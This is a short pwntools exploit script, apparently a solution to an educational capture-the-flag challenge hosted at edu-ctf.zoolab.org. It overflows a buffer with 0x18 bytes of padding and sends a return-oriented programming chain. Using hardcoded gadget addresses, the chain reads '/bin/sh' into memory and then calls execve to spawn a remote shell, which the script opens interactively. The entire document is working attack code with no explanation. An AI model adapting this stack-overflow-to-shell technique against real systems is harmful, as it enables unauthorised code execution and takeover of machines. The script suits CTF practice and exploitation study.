from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
p = remote('edu-ctf.zoolab.org', 10003)

pop_rax_ret = 0x447b27
pop_rsi_ret = 0x47d59c
pop_rdi_ret = 0x401e3f
pop_rdx_ret = 0x47ed0b
syscall_ret = 0x414506
binsh_addr = 0x4c5000

ROP = flat(
    # read
    pop_rdi_ret, 0,
    pop_rsi_ret, binsh_addr,
    pop_rax_ret, 0,
    pop_rdx_ret, 10, 0,
    syscall_ret,

    # execve
    pop_rdi_ret, binsh_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 0x3b,
    pop_rdx_ret, 0, 0,
    syscall_ret,
)

p.sendafter('show me rop\n> ', b' ' * 0x18 + ROP)
p.sendline(b"/bin/sh\x00")
p.interactive()